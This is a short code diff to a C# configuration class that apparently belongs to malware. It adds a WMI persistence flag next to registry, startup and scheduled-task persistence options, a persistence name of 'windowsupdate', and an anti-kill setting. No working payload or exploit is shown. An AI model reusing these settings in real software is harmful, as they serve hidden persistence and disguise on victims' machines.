@@ -16,6 +16,7 @@ internal static class Config
     public const bool PersistRegistry = false;
     public const bool PersistStartup = false;
     public const bool PersistTask = false;
+    public const bool PersistWmi = false;
     public const string PersistName = "windowsupdate";
 
     public const bool AntiKill = true;
